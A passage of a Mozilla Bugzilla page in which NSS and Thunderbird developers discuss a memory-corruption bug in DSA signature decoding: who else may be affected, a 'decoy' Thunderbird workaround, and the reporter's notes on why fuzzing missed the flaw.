                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-38" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c38">Comment 38</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-29 10:53 PDT" data-time="1635530029">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-38">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-38" data-comment-id="15634600"><p>I haven&#39;t tested, but I&#39;m told this probably affects Java when operating in FIPS mode? I don&#39;t know if that&#39;s a common enough configuration that we should also inform Oracle?(In reply to Benjamin Beurdouche [:beurdouche] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c31" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #31</a>)</p>
<blockquote>
<p>I agree, I might CC at least one person from Apple so that they can double check that they are not affected though.</p>
</blockquote>
<p>I haven&#39;t tested, but I&#39;m told this probably affects Java when operating in FIPS mode? I don&#39;t know if that&#39;s a common enough configuration that we should also inform Oracle, perhaps you know?</p>
</div></div><div class="change-set" id="c39"><div class="comment" data-id="15634610" data-no="39"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-39" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_36541" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/d11b5b0a468ed960df1fde3c304d3580?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_36541" id="a270777_75935"><a class="email " href="/user_profile?user_id=36541" > <span class="fna">Kai Engert [:KaiE:]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-39"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-39" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c39">Comment 39</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-29 11:06 PDT" data-time="1635530798">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-39">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-39" data-comment-id="15634610"><p>Actually:</p>
<p>Currently, when verifying the certificate that was used to sign an email, Thunderbird <em>already</em> starts by using mozpkix to verify the signing certificate:<br>
<a href="https://searchfox.org/comm-esr91/rev/cc5a292314d25cc582225fd22a20f7bd3b0f6072/mailnews/extensions/smime/nsCMS.cpp#261" rel="nofollow">https://searchfox.org/comm-esr91/rev/cc5a292314d25cc582225fd22a20f7bd3b0f6072/mailnews/extensions/smime/nsCMS.cpp#261</a></p>
<p>If mozpkix cannot verify the signing certificate, TB will treat the signature as invalid.</p>
<p>I don&#39;t see bug reports in the Security:S/MIME component mentioning the term DSA. It looks like nobody has complained that S/MIME signatures from DSA certificates are always shown as invalid.</p>
<p>The patch here will prevent the import of DSA certificates that are received as part of an S/MIME message. If that&#39;s the only path a user uses to obtain encryption certificates, then the patch will also prevent the import of encryption certificates. This is a regression.</p>
<p>I think I&#39;m willing to accept that. Users could still import such certificates using other approaches, e.g. manual certificate manager import, or downloading from LDAP.</p>
<p>The highest priority for me is stopping the drive-by attack, having users at risk simply by receiving an email. If we learn that we have TB users that depend on DSA certificates, we could remove this workaround, once NSS with the crash fix is ready.</p>
</div></div><div class="change-set" id="c40"><div class="comment" data-id="15634634" data-no="40"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-40" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_622637" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/38f561698d679a724938d4600c0f8b52?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_622637" id="a270777_75935"><a class="email " href="/user_profile?user_id=622637" > <span class="fna">Benjamin Beurdouche [:beurdouche]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-40"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-40" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c40">Comment 40</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-29 11:24 PDT" data-time="1635531844">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-40">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-40" data-comment-id="15634634"><blockquote>
<p>I haven&#39;t tested, but I&#39;m told this probably affects Java when operating in FIPS mode? I don&#39;t know if that&#39;s a common enough configuration that we should also inform Oracle, perhaps you know?</p>
</blockquote>
<p>Thanks for that info Tavis!<br>
Kai, Bob, do you know if and how Oracle is using NSS? I didn&#39;t know about it.</p>
</div><div class="activity"><div class="change">Flags: needinfo?(rrelyea)</div><div class="change">Flags: needinfo?(kaie)</div></div></div><div class="change-set" id="c41"><div class="comment" data-id="15634875" data-no="41"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-41" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_592223" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/27c1a60000797d8e229249290a7c7377?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_592223" id="a270777_75935"><a class="email " href="/user_profile?user_id=592223" > <span class="fna">taviso</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-41"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-41" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c41">Comment 41</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-29 14:45 PDT" data-time="1635543902">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-41">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-41" data-comment-id="15634875"><p>FWIW, here are my current notes on what I think went wrong with the fuzzing. If you would like to see a full draft of my postmortem please let me know (it&#39;s in a google doc, but I can send you a PDF).</p>
<hr>
<p>How did extensive, customized fuzzing with impressive metrics fail to discover this bug?</p>
<ul>
<li><strong>Issue #1</strong> <em>Missing end-to-end testing.</em></li>
</ul>
<p>NSS is a <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSS/NSS_API_Guidelines" rel="nofollow">highly modular</a> library. This layered design is reflected in the <a href="https://searchfox.org/nss/source/fuzz/" rel="nofollow">fuzzing</a>, as each component is fuzzed individually. For example, the QuickDER decoder is tested <a href="https://searchfox.org/nss/source/fuzz/quickder_target.cc" rel="nofollow">extensively</a>, but the fuzzer simply <a href="https://searchfox.org/nss/rev/5f2fa238b58c9158a52c0681ca2a67958a353082/fuzz/quickder_target.cc#72" rel="nofollow">creates and discards</a> objects and never uses them.</p>
<pre><code class="language-c">extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) {
 char *dest[2048];
 
 for (auto tpl : templates) {
   PORTCheapArenaPool pool;
   SECItem buf = {siBuffer, const_cast&lt;unsigned char *&gt;(Data),
                  static_cast&lt;unsigned int&gt;(Size)};
 
   PORT_InitCheapArena(&amp;pool, DER_DEFAULT_CHUNKSIZE);
   (void)SEC_QuickDERDecodeItem(&amp;pool.arena, dest, tpl, &amp;buf);
   PORT_DestroyCheapArena(&amp;pool);
 }
</code></pre>
<blockquote>
<p>Fig n. The QuickDER fuzzer simply creates and discards objects. This verifies the ASN.1 parsing, but not the resulting objects.</p>
</blockquote>
<p>This fuzzer might have produced a <code>SECKEY_DSA_PublicKey</code> that could have reached the vulnerable code, but as it was never used to verify a signature the bug was never triggered.</p>
<ul>
<li><strong>Issue  #2</strong> <em>Arbitrary size limits.</em></li>
</ul>
<p>If the QuickDER fuzzing target had attempted to call cryptographic APIs with fuzzed objects, this bug would still not have been discovered because there is an arbitrary size limit of <a href="https://searchfox.org/nss/rev/5f2fa238b58c9158a52c0681ca2a67958a353082/fuzz/quickder_target.cc#65" rel="nofollow">2048 bytes</a> in the created fuzzed objects.</p>
<p>This choice is arbitrary, there is no such limit within NSS, many structures and templates can legitimately exceed this. As the key size necessary to trigger this bug must exceed 2048 bytes, even if libFuzzer had produced ASN.1 that would have triggered the bug, QuickDER would have failed to decode it.</p>
<p>It makes sense to reflect the real limitations of NSS while fuzzing, rather than arbitrarily chosen limits. In fact, it probably makes sense to exceed the limitations of NSS. In this case, in order to trigger an ASAN warning at least 24 additional bytes were required to exceed the bounds of the heap allocation. While a smaller overflow would still be dangerous, these <a href="https://github.com/google/sanitizers/wiki/AddressSanitizerIntraObjectOverflow" rel="nofollow">intra-object</a> overflows are invisible to ASAN.</p>
<ul>
<li><strong>Issue #3</strong> <em>Misleading metrics.</em></li>
</ul>
<p>The NSS fuzzers are represented in single combined coverage metrics by oss-fuzz, rather than their individual coverage. This data proved misleading, the vulnerable code is fuzzed extensively but by fuzzers that could not possibly generate a relevant input.</p>
<p>This is because the fuzzers like the <a href="https://searchfox.org/nss/source/fuzz/tls_server_target.cc" rel="nofollow">tls_server_target</a> use fixed, hardcoded <a href="https://searchfox.org/nss/source/fuzz/tls_server_certs.cc" rel="nofollow">certificates</a> while they fuzz TLS messages and protocol states.</p>
<hr>
</div></div><div class="change-set" id="c42"><div class="comment" data-id="15634886" data-no="42"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-42" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_592223" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/27c1a60000797d8e229249290a7c7377?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_592223" id="a270777_75935"><a class="email " href="/user_profile?user_id=592223" > <span class="fna">taviso</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-42"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-42" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c42">Comment 42</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-29 15:07 PDT" data-time="1635545267">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-42">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-42" data-comment-id="15634886"><p>(In reply to taviso from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c41" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #41</a>)</p>
<blockquote>
<ul>
<li><strong>Issue  #2</strong> <em>Arbitrary size limits.</em></li>
</ul>
</blockquote>
<p>I&#39;m wrong about this, the limit is higher and on the libFuzzer input not output - Ryan pointed out my error. I think the other points remain valid!</p>
</div></div><div class="change-set" id="c43"><div class="comment" data-id="15634889" data-no="43"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-43" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_11099" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/4e29cfbfaece102427b6d6aa84d135f5?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_11099" id="a270777_75935"><a class="email " href="/user_profile?user_id=11099" > <span class="fna">Robert Relyea</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-43"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-43" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c43">Comment 43</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-29 15:10 PDT" data-time="1635545419">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-43">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-43" data-comment-id="15634889"><p>I know Red Hat uses NSS and Java in FIPS mode, I suspect Oracle does as well (they do have their own NSS FIPS validation). That being said, I&#39;m not sure FIPS will affect the outcome. Red Hat disables DSA by policy (by default) on all their libraries in RHEL-8 even in FIPS mode.</p>
<p>I&#39;m mildly surprised that mozpkix hasn&#39;t grown RSA-PSS support yet with the push to move off of RSA-PKCS.</p>
</div></div><div class="change-set" id="c44"><div class="comment" data-id="15634897" data-no="44"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-44" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_438654" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/46e6b92a08f8b5ece24df3416e36f4cc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_438654" id="a270777_75935"><a class="email " href="/user_profile?user_id=438654" > <span class="fna">Martin Thomson [:mt:]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-44"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-44" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c44">Comment 44</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-29 15:22 PDT" data-time="1635546175">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-44">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-44" data-comment-id="15634897"><p>PSS support is planned, but there have been other more pressing concerns.</p>
</div></div><div class="change-set" id="c45"><div class="comment" data-id="15634909" data-no="45"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-45" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_36541" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/d11b5b0a468ed960df1fde3c304d3580?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_36541" id="a270777_75935"><a class="email " href="/user_profile?user_id=36541" > <span class="fna">Kai Engert [:KaiE:]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-45"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-45" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c45">Comment 45</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-29 15:33 PDT" data-time="1635546819">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-45">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-45" data-comment-id="15634909"><p>I have filed decoy <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1738501" title="RESOLVED FIXED - Automatic S/MIME cert import should use additional verification using mozilla::pkix">bug 1738501</a> for the suggested Thunderbird workaround. I&#39;ll move the Thunderbird patch over, and ask there for a review.</p>
<p>Also, I don&#39;t have much information about Oracle&#39;s use of NSS. All I know is that they forked server products in the past that use NSS. We have a private NSS discussion list, and we used to have someone from Oracle on that list. If you have trouble finding a contact at Oracle, we could try asking on that list for current users of NSS at Oracle.</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(kaie)</span></div></div></div><div class="change-set" id="a459302_36541"><div class="change" id="aa459302_36541">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_36541" id="a459302_36541"><img src="https://secure.gravatar.com/avatar/d11b5b0a468ed960df1fde3c304d3580?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_36541" id="a459302_36541"><a class="email " href="/user_profile?user_id=36541" > <span class="fna">Kai Engert [:KaiE:]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="as-a459302_36541"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a459302_36541">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#a459302_36541">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-29 15:34 PDT" data-time="1635546859">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9248424&amp;action=edit"
           title="Thunderbird decoy workaround, v1 (moved to bug 1738501)"
           class=""
        >Attachment #9248424</a> -
        Attachment description: Thunderbird decoy workaround, v1 &rarr; Thunderbird decoy workaround, v1 (moved to bug 1738501)</div><div class="change">
        <a href="/attachment.cgi?id=9248424&amp;action=edit"
           title="Thunderbird decoy workaround, v1 (moved to bug 1738501)"
           class=""
        >Attachment #9248424</a> -
        Attachment is obsolete: true</div></div></div><div class="change-set" id="c46"><div class="comment" data-id="15635464" data-no="46"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-46" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_36541" id="a459302_36541"><img src="https://secure.gravatar.com/avatar/d11b5b0a468ed960df1fde3c304d3580?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_36541" id="a459302_36541"><a class="email " href="/user_profile?user_id=36541" > <span class="fna">Kai Engert [:KaiE:]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-46"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-46" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c46">Comment 46</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-31 08:48 PDT" data-time="1635695298">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-46">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-46" data-comment-id="15635464"><p>Dan, do you agree with immediate landing of the Thunderbird patch in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1738501" title="RESOLVED FIXED - Automatic S/MIME cert import should use additional verification using mozilla::pkix">bug 1738501</a> into comm-central, comm-beta and comm-esr91 ?</p>
<p>I&#39;d say it should be fine, it shouldn&#39;t give any clue why the additional check is done.</p>
<p>I have tested that the patch prevents the crash in c-c and esr91.<br>
S/MIME automated tests executed locally for comm-esr91 still pass.</p>
</div><div class="activity"><div class="change">Flags: needinfo?(dveditz)</div></div></div><div class="change-set" id="a689268_600971"><div class="change" id="aa689268_600971">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_600971" id="a689268_600971"><img src="https://secure.gravatar.com/avatar/a088418052679d9583556d277e6774ee?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_600971" id="a689268_600971"><a class="email " href="/user_profile?user_id=600971" > <span class="fna">Phabricator Automation</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="as-a689268_600971"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a689268_600971">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#a689268_600971">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-01 07:27 PDT" data-time="1635776825">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9247769&amp;action=edit"
           title="Bug 1737470 - Ensure DER encoded signatures are within size limits. r=jschanck,mt,bbeurdouche,rrelyea"
           class=""
        >Attachment #9247769</a> -
        Attachment description: WIP: Bug 1737470 - Ensure DSA signatures are within maximum size limits. &rarr; WIP: Bug 1737470 - Ensure DER encoded signatures are within size limits.</div></div></div><div class="change-set" id="c47"><div class="comment" data-id="15637813" data-no="47"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-47" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a689268_600971"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_1689" id="a689268_600971"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-47"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-47" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c47">Comment 47</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-01 09:29 PDT" data-time="1635784184">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-47">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-47" data-comment-id="15637813"><blockquote>
<p>I have filed decoy <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1738501" title="RESOLVED FIXED - Automatic S/MIME cert import should use additional verification using mozilla::pkix">bug 1738501</a> for the suggested Thunderbird workaround. I&#39;ll move the Thunderbird patch over, and ask there for a review.</p>
</blockquote>
<p>It will work better as a &quot;decoy&quot; if it&#39;s not a hidden bug. Anyone object to that? The bug doesn&#39;t reveal as much as the patch itself does, which is minimal (a refactoring to add a call to mozilla::pkix). As djackson pointed out in slack, the last-minute and hacky expedient nature of incorporating the NSS routines might raise eyebrows anyway. At least if the bug isn&#39;t hidden folks relying on automated scanners won&#39;t be prompted for a closer human look.</p>
<blockquote>
<p>Dan, do you agree with immediate landing of the Thunderbird patch in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1738501" title="RESOLVED FIXED - Automatic S/MIME cert import should use additional verification using mozilla::pkix">bug 1738501</a> into comm-central, comm-beta and comm-esr91 ?</p>
</blockquote>
<p>Yes. At the moment Thunderbird users are at the most immediate risk from this bug as far as we&#39;ve found.</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(dveditz)</span></div></div></div><div class="change-set" id="c48"><div class="comment" data-id="15637827" data-no="48"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-48" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_36541" id="a689268_600971"><img src="https://secure.gravatar.com/avatar/d11b5b0a468ed960df1fde3c304d3580?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_36541" id="a689268_600971"><a class="email " href="/user_profile?user_id=36541" > <span class="fna">Kai Engert [:KaiE:]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-48"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-48" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c48">Comment 48</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-01 09:40 PDT" data-time="1635784852">3 years ago</span>
          </div>&bull;
<div class="change-revisions">
  <a href="/page.cgi?id=comment-revisions.html&amp;bug_id=1737470&amp;comment_id=15637827"
     title="2 revisions">Edited</a>
</div>
        </td>
      </tr>

      <tr id="ctag-48">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-48" data-comment-id="15637827"><p>(In reply to Daniel Veditz [:dveditz] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c47" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #47</a>)</p>
<blockquote>
<p>It will work better as a &quot;decoy&quot; if it&#39;s not a hidden bug. Anyone object to that?</p>
</blockquote>
<p>It was wsmwk (not on cc) who had suggested for the decoy bug to be hidden. But it was only a suggestion. If we have good reason to unhide it, it should be fine with him.</p>
</div></div><div class="change-set" id="a700692_1689"><div class="change" id="aa700692_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a700692_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a700692_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="as-a700692_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a700692_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#a700692_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-01 10:37 PDT" data-time="1635788249">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Assignee: nobody &rarr; djackson</div></div></div><div class="change-set" id="c49"><div class="comment" data-id="15637933" data-no="49"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-49" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_622637" id="a700692_1689"><img src="https://secure.gravatar.com/avatar/38f561698d679a724938d4600c0f8b52?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_622637" id="a700692_1689"><a class="email " href="/user_profile?user_id=622637" > <span class="fna">Benjamin Beurdouche [:beurdouche]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-49"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-49" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c49">Comment 49</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-01 10:53 PDT" data-time="1635789187">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-49">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-49" data-comment-id="15637933"><p>CCing Bailey from Apple so that she can double check that this is not a problem for them.</p>
</div></div><div class="change-set" id="a701655_622637"><div class="change" id="aa701655_622637">
    <table class="layout-table change-head " role="presentation">
      <tr>
